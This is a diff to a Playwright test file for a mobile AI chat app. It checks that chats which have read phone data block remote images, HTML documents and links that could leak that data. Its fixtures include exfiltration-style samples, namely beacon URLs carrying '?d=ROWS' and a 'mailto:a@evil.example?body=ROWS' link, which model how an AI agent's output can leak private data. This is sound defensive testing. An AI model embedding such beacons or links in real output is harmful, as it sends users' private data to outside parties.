@@ -3,7 +3,7 @@
 // Not covered here, because it is Java: the biometric itself, Android's permission dialog, the generation counter that
 // lets an off win over an on in flight, the switch cleared when a permission is seen missing, and blocked detection.
 // Those were only compiled; they need a real phone (docs/status/phone-data.md).
-const { WEB, check, sleep, nativeShell, png } = require('../lib.cjs')
+const { WEB, MOCK, check, sleep, nativeShell, png } = require('../lib.cjs')
 
 module.exports = async t => {
   const { browser } = t
@@ -560,5 +560,211 @@ module.exports = async t => {
     st = await state(pg)
     check(st.asked.length > 0 && st.remote.length > 0 && st.remote.every(r => r.block === false) && st.imgs.some(s => /card-image\.png\?d=ROWS/.test(s)), `phone data native record, control: a chat the app has no record of is not blocked and shows its card images (${JSON.stringify(st.remote)}, ${JSON.stringify(st.imgs)})`)
     await pg.close()
+  }
+  {
+    // Round 3: the chat's whole lineage is asked about (a compression gives a new stored id, a restart a new live id); a bridge that
+    // throws means "read"; a saved document is judged by ITS chat, not the one on screen; a bare mailto: link never skips the dialog.
+    const hits = []
+    const open = async (sid, { ids = [], lineage = null, throws = false, anyRead = false, noMethod = false } = {}) => {
+      const pg = await browser.newPage({ viewport: { width: 375, height: 812 } })
+      await pg.addInitScript(nativeShell)
+      await pg.addInitScript(
+        ([sid, ids, lineage, throws, anyRead, noMethod]) => {
+          localStorage.setItem('hm.lastSession', JSON.stringify({ id: sid, profile: 'default' }))
+          if (lineage) localStorage.setItem('hm.lineage.v1', JSON.stringify(lineage))
+          window.__remote = []
+          window.__tcalls = []
+          window.__opened = []
+          window.open = u => (window.__opened.push(String(u)), null)
+          window.__sid = 'rt-' + sid
+          const b = {
+            remoteBlock: (key, on) => window.__remote.push({ block: on, key }),
+            remoteAllowOnce: () => {},
+            phoneDataAnyRead: () => anyRead
+          }
+          if (!noMethod)
+            b.phoneDataTainted = (key, id) => {
+              window.__tcalls.push(id)
+              if (throws) throw new Error('bridge down')
+              return ids.includes(id)
+            }
+          Object.assign(window.HermesAndroid, b)
+          window.__socks = []
+          const Orig = window.WebSocket
+          window.WebSocket = class extends Orig {
+            constructor(...a) {
+              super(...a)
+              window.__socks.push(this)
+              this.addEventListener('message', e => {
+                try {
+                  const m = JSON.parse(e.data)
+                  if (m.params && m.params.session_id) window.__sid = m.params.session_id
+                } catch {
+                  /* not JSON */
+                }
+              })
+            }
+          }
+        },
+        [sid, ids, lineage, throws, anyRead, noMethod]
+      )
+      for (const scheme of ['http', 'https'])
+        await pg.route(`${scheme}://beacon.test/**`, r => {
+          hits.push(r.request().url())
+          return r.fulfill({ status: 200, contentType: 'image/png', body: png })
+        })
+      await pg.goto(WEB + '/')
+      await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
+      await sleep(1500)
+      return pg
+    }
+    const rem = pg => pg.evaluate(() => window.__remote)
+    const cardImgs = pg => pg.evaluate(() => [...document.querySelectorAll('.hm-openui')].flatMap(h => [...(h.shadowRoot || h).querySelectorAll('img')].map(i => i.getAttribute('src') || '')))
+    const CHAT = 's-pd-leaks-ctl' // no phone_data call in its items
+    const allBlocked = r => r.length > 0 && r.every(x => x.block === true)
+
+    // ── lineage: S1 read, the chat was compressed to S2 (CHAT), the app restarted: only S1 is recorded ──
+    hits.length = 0
+    let pg = await open(CHAT, { ids: ['seg-old'], lineage: [{ s: ['seg-old', CHAT], r: ['rt-gone'] }] })
+    let r = await rem(pg)
+    let asked = await pg.evaluate(() => window.__tcalls)
+    check(asked.includes('seg-old') && allBlocked(r) && hits.length === 0, `phone data lineage: an earlier segment of the chat that read makes the chat blocked (asked ${JSON.stringify(asked)}, ${JSON.stringify(r)})`)
+    check((await cardImgs(pg)).every(s => !/beacon\.test/.test(s)), 'phone data lineage: and its card images are held back')
+    hits.length = 0
+    await pg.reload()
+    await pg.locator('.msg.assistant').first().waitFor({ timeout: 15000 })
+    await sleep(1200)
+    r = await rem(pg)
+    check(allBlocked(r) && hits.length === 0, `phone data lineage: after a reload (the preview path) it is never reported as not blocked (${JSON.stringify(r)})`)
+    await pg.close()
+    // control: the same lineage but nothing recorded; and an old segment recorded but no lineage known to the page (what it could not cover)
+    pg = await open(CHAT, { ids: [], lineage: [{ s: ['seg-old', CHAT], r: [] }] })
+    r = await rem(pg)
+    check(r.length > 0 && r.every(x => x.block === false), `phone data lineage, control: nothing recorded -> not blocked (${JSON.stringify(r)})`)
+    await pg.close()
+    pg = await open(CHAT, { ids: ['seg-old'] })
+    r = await rem(pg)
+    check(r.length > 0 && r.every(x => x.block === false), `phone data lineage, limit: a link the page never saw can't be asked about (${JSON.stringify(r)})`)
+    // a session.info naming another stored id (a compression happened) links it, and the chat becomes blocked
+    await pg.evaluate(() => {
+      const s = window.__socks.filter(x => x.readyState === 1).pop()
+      s.dispatchEvent(new MessageEvent('message', { data: JSON.stringify({ jsonrpc: '2.0', method: 'event', params: { type: 'session.info', session_id: window.__sid, payload: { stored_session_id: 'seg-old' } } }) }))
+    })
+    await sleep(1500)
+    r = await rem(pg)
+    check(r[r.length - 1].block === true, `phone data lineage: a session.info with another stored id links it to the chat (${JSON.stringify(r.slice(-2))})`)
+    await pg.close()
+
+    // ── a bridge that throws means "read" (fail closed); a missing method does not break a chat the page can judge ──
+    hits.length = 0
+    pg = await open(CHAT, { throws: true })
+    r = await rem(pg)
+    check(allBlocked(r) && (await cardImgs(pg)).every(s => !/beacon\.test/.test(s)) && hits.length === 0, `phone data fail closed: a throwing phoneDataTainted blocks the chat (${JSON.stringify(r)})`)
+    await pg.close()
+    pg = await open(CHAT, { noMethod: true })
+    r = await rem(pg)
+    check(r.length > 0 && r.every(x => x.block === false), `phone data fail closed, control: a shell without the method leaves a chat with no phone_data item alone (${JSON.stringify(r)})`)
+    await pg.close()
+
+    // ── a bare mailto: link in a chat that read shows its full text first; opens only on Open ──
+    const mail = 'mailto:a@evil.example?body=ROWS'
+    const noticeMail = pg2 =>
+      pg2.evaluate(m => {
+        const s = window.__socks.filter(x => x.readyState === 1).pop()
+        s.dispatchEvent(new MessageEvent('message', { data: JSON.stringify({ jsonrpc: '2.0', method: 'event', params: { type: 'review.summary', session_id: window.__sid, payload: { text: `[mail me](${m})` } } }) }))
+      }, mail)
+    pg = await open(CHAT, { ids: [CHAT] })
+    await noticeMail(pg)
+    await pg.locator('.notice a', { hasText: 'mail me' }).click({ timeout: 5000 })
+    const d = await pg.locator('.dialog').innerText({ timeout: 3000 }).catch(() => null)
+    check(d && d.includes(mail) && d.includes('body=ROWS') && (await pg.evaluate(() => window.__opened)).length === 0, `phone data mailto: the full link is shown and nothing opened yet (${d})`)
+    await pg.locator('.dialog').getByRole('button', { name: 'Cancel' }).click()
+    check((await pg.evaluate(() => window.__opened)).length === 0, 'phone data mailto: Cancel opens nothing')
+    await pg.close()
+    pg = await open(CHAT, { ids: [] })
+    await noticeMail(pg)
+    await pg.locator('.notice a', { hasText: 'mail me' }).click({ timeout: 5000 })
+    await sleep(300)
+    check((await pg.locator('.dialog').count()) === 0 && (await pg.evaluate(() => window.__opened)).length === 1, 'phone data mailto, control: an untainted chat opens it at once')
+    await pg.close()
+
+    // ── a saved document is judged by its own chat: Gallery and Files, with an untainted chat on screen ──
+    const docHits = () => hits.filter(h => /\/(doc|md)\.png/.test(h))
+    const post = (p, b) => fetch(MOCK + p, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(b) })
+    await post('/api/plugins/hermes-mobile/canvas/doc', { session: 's-pd-docchat', title: 'Rows page', type: 'html', content: '<img src="http://beacon.test/doc.png?d=ROWS"><p>rows</p>' })
+    await post('/api/plugins/hermes-mobile/canvas/doc', { session: 's-pd-docchat', title: 'Rows notes', type: 'markdown', content: '![x](http://beacon.test/md.png?d=ROWS)\n\nsee [here](http://beacon.test/p?d=ROWS)' })
+    await post('/api/plugins/hermes-mobile/canvas/doc', { session: 's-pd-cleanchat', title: 'Clean page', type: 'html', content: '<p>clean</p>' })
+    const gallery = async pg2 => {
+      await pg2.getByRole('button', { name: /^Sessions/ }).click()
+      await pg2.locator('.nav-tile', { hasText: 'Hermux' }).click()
+      await pg2.locator('.hub-card', { hasText: 'Canvas gallery' }).click()
+      await pg2.locator('.gallery-card').first().waitFor({ timeout: 8000 })
+    }
+    hits.length = 0
+    pg = await open(CHAT, { ids: ['s-pd-docchat'] })
+    await gallery(pg)
+    await pg.locator('.gallery-card', { hasText: 'Rows page' }).click()
+    await sleep(900)
+    let v = await pg.evaluate(() => ({ frames: document.querySelectorAll('iframe').length, held: document.querySelectorAll('.html-held').length }))
+    r = await rem(pg)
+    check(v.frames === 0 && v.held === 1 && r[r.length - 1].block === true && docHits().length === 0, `phone data gallery: an HTML page from a chat that read is not run, though the chat on screen did not read (${JSON.stringify(v)}, ${JSON.stringify(r.slice(-2))})`)
+    await pg.evaluate(() => window.hermesBack())
+    await sleep(700)
+    r = await rem(pg)
+    check(r[r.length - 1].block === false, `phone data gallery: closing it lets the shell's filter off again (${JSON.stringify(r.slice(-2))})`)
+    await pg.locator('.gallery-card', { hasText: 'Rows notes' }).click()
+    await sleep(900)
+    v = await pg.evaluate(() => ({ imgs: document.querySelectorAll('.lib-viewer img').length, holds: document.querySelectorAll('.lib-viewer .remote-hold').length }))
+    check(v.imgs === 0 && v.holds === 1 && docHits().length === 0, `phone data gallery: a Markdown document's remote image waits behind a tap (${JSON.stringify(v)}, ${JSON.stringify(docHits())})`)
+    await pg.locator('.lib-viewer a', { hasText: 'here' }).click()
+    const dd = await pg.locator('.dialog').innerText({ timeout: 3000 }).catch(() => null)
+    check(dd && dd.includes('Site: beacon.test') && dd.includes('?d=ROWS'), `phone data gallery: a link in it shows its address first (${dd})`)
+    await pg.locator('.dialog').getByRole('button', { name: 'Cancel' }).click()
+    await pg.evaluate(() => window.hermesBack())
+    await sleep(500)
+    // control: a document of an untainted chat still runs in its frame
+    await pg.locator('.gallery-card', { hasText: 'Clean page' }).click()
+    await sleep(900)
+    v = await pg.evaluate(() => ({ frames: document.querySelectorAll('iframe.html-frame').length, held: document.querySelectorAll('.html-held').length }))
+    r = await rem(pg)
+    check(v.frames === 1 && v.held === 0 && r[r.length - 1].block === false, `phone data gallery, control: a page from an untainted chat still runs (${JSON.stringify(v)})`)
+    await pg.close()
+    // the document's chat has an older segment that read (lineage), and the old copy with no chat (unknown) counts once any read exists
+    pg = await open(CHAT, { ids: ['seg-doc-old'], lineage: [{ s: ['seg-doc-old', 's-pd-docchat'], r: [] }] })
+    await gallery(pg)
+    await pg.locator('.gallery-card', { hasText: 'Rows page' }).click()
+    await sleep(900)
+    v = await pg.evaluate(() => ({ frames: document.querySelectorAll('iframe').length, held: document.querySelectorAll('.html-held').length }))
+    check(v.frames === 0 && v.held === 1, `phone data gallery: a document whose chat was compressed from a chat that read is held (${JSON.stringify(v)})`)
+    await pg.close()
+    pg = await open(CHAT, { ids: [], anyRead: true })
+    await gallery(pg)
+    await pg.locator('.gallery-card', { hasText: 'Old notes' }).click()
+    await sleep(900)
+    v = await pg.evaluate(() => ({ holds: document.querySelectorAll('.lib-viewer .remote-hold').length, guarded: document.querySelectorAll('.lib-viewer .md').length }))
+    r = await rem(pg)
+    check(r[r.length - 1].block === true, `phone data gallery: a document of an unknown chat is held once the app has recorded any read (${JSON.stringify(r.slice(-2))})`)
+    await pg.close()
+    pg = await open(CHAT, { ids: [], anyRead: false })
+    await gallery(pg)
+    await pg.locator('.gallery-card', { hasText: 'Old notes' }).click()
+    await sleep(900)
+    r = await rem(pg)
+    check(r.every(x => x.block === false), `phone data gallery, control: ... and not before any read (${JSON.stringify(r.slice(-2))})`)
+    await pg.close()
+
+    // Files: a file has no chat, so it is judged by whether the app has ever recorded a read
+    for (const [anyRead, want] of [[true, true], [false, false]]) {
+      pg = await open(CHAT, { ids: [], anyRead })
+      await pg.getByRole('button', { name: /^Sessions/ }).click()
+      await pg.locator('.nav-tile', { hasText: 'Hermux' }).click()
+      await pg.locator('.hub-card', { hasText: 'Files' }).click()
+      await pg.locator('.file-row', { hasText: 'page.html' }).click()
+      await sleep(1200)
+      v = await pg.evaluate(() => ({ frames: document.querySelectorAll('iframe.html-frame').length, held: document.querySelectorAll('.html-held').length }))
+      r = await rem(pg)
+      check(want ? v.frames === 0 && v.held === 1 && r[r.length - 1].block === true : v.frames === 1 && v.held === 0 && r.every(x => x.block === false), `phone data files${want ? '' : ', control'}: an HTML file ${want ? 'is held once a read was recorded' : 'still runs when no read was ever recorded'} (${JSON.stringify(v)}, ${JSON.stringify(r.slice(-2))})`)
+      await pg.close()
+    }
   }
 }
